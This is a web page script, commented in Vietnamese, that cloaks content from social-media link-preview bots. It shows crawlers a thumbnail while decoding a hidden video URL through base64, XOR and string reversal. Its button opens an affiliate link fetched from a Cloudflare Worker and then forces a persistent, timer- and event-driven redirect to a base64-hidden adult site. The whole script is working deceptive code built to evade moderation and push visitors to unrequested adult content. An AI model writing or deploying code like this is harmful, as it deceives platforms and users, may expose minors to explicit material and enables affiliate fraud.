<script>
// --- Hàm phụ ---
function xorDecode(str, key) {
  let res = '';
  for (let i = 0; i < str.length; i++) {
    res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return res;
}
function reverseString(s) { return s.split('').reverse().join(''); }

// --- Mã hóa video URL ---
const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
const xorKey = "PandaKey2025";

// --- Mã hóa link 18+ ---
const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";

// --- Phát hiện bot ---
function isBot() {
  const ua = (navigator.userAgent || "").toLowerCase();
  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
  return keywords.some(k => ua.includes(k)) || navigator.webdriver;
}

// --- Phát hiện thiết bị ---
function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
function isAndroid() { return /Android/i.test(navigator.userAgent); }
function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }

// --- Điều hướng 18+ bền bỉ ---
function navigate18Resilient(url) {
  let done = false;
  let t1 = null, t2 = null, t3 = null;

  const go = () => {
    if (done) return;
    done = true;
    if (t1) clearTimeout(t1);
    if (t2) clearTimeout(t2);
    if (t3) clearTimeout(t3);
    window.removeEventListener('pagehide', onPageHide, optsOnce);
    window.removeEventListener('focus', onFocus, optsOnce);
    window.removeEventListener('pageshow', onPageShow, optsOnce);
    document.removeEventListener('visibilitychange', onVisibleChange);

    try {
      window.location.replace(url);
    } catch (_) {
      window.location.href = url;
    }
  };

  const onPageHide = () => setTimeout(go, 120);
  const onFocus = () => go();
  const onPageShow = () => go();
  const onVisibleChange = () => { if (document.visibilityState === 'visible') go(); };

  const optsOnce = { once: true };

  const d1 = isIOSChrome() ? 250 : 80;
  const d2 = isIOSChrome() ? 800 : 300;

  t1 = setTimeout(go, d1);
  t2 = setTimeout(go, d2);
  t3 = setTimeout(go, 1800);

  window.addEventListener('pagehide', onPageHide, optsOnce);
  window.addEventListener('focus', onFocus, optsOnce);
  window.addEventListener('pageshow', onPageShow, optsOnce);
  document.addEventListener('visibilitychange', onVisibleChange);
}

// --- Lấy affiliate link qua Cloudflare Worker ---
async function getAffiliateLink() {
  try {
    const resp = await fetch("https://panda-redirect.kitthh1412.workers.dev/");
    if (!resp.ok) throw new Error("Worker fail");
    const data = await resp.json();
    return data.link || "https://invl.me/clmwy1k"; // fallback VN
  } catch (e) {
    return "https://invl.me/clmwy1k"; // fallback VN
  }
}

document.addEventListener('DOMContentLoaded', function() {
  const thumbnail = document.getElementById('thumbnail');
  const real = document.getElementById('real-content');
  const vid = document.getElementById('main-video');

  if (isBot()) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
    return;
  }

  try {
    const raw = atob(enc3_b64);
    const step = xorDecode(raw, xorKey);
    const videoURL = reverseString(step);

    thumbnail.style.display = 'none';
    real.style.display = 'block';
    vid.src = videoURL;
    vid.play().catch(()=>{});
  } catch (err) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
  }

  // --- Nút CTA ---
  document.getElementById('ctaBtn').addEventListener('click', async function(e){
    e.preventDefault();

    // --- Mở Shopee Affiliate (Worker trả link đúng) ---
    const affLink = await getAffiliateLink();
    const a = document.createElement("a");
    a.href = affLink;
    a.target = "_blank";
    a.rel = "noopener noreferrer";
    document.body.appendChild(a);
    a.click();

    // --- Điều hướng 18+ ---
    const link18 = atob(link18_b64);
    navigate18Resilient(link18);

    setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
  });
});
</script>
